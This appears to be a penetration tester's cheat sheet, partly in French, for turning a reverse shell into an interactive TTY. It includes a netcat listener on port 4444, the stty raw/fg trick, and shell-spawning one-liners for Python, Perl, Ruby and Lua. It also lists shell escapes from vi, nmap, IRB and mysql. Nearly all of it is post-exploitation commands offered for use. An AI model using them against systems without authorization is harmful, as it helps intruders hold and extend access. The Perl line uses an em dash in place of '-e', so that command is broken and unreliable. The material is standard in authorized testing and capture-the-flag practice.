# Spawn a TTY


On Kali:
1) sh
2) nc -lvnp 4444

start reverse shell

1) run command
2) Ctrl+z
3) stty -a | head -n1
4) stty raw -echo; fg<enter><enter>

et donc dans le shell:
export HOME=/root
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 24 columns 80



python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
python2 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c "__import__('pty').spawn('/bin/bash')"
python3 -c "__import__('subprocess').call(['/bin/bash'])"

echo os.system('/bin/bash')

/bin/sh -i

perl —e 'exec "/bin/sh";'

perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')

From within IRB:
exec "/bin/sh"

From within vi:
:!bash

From within vi2:
:set shell=/bin/bash:shell

From within nmap:
!sh

mysql: ! bash

## from other info
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/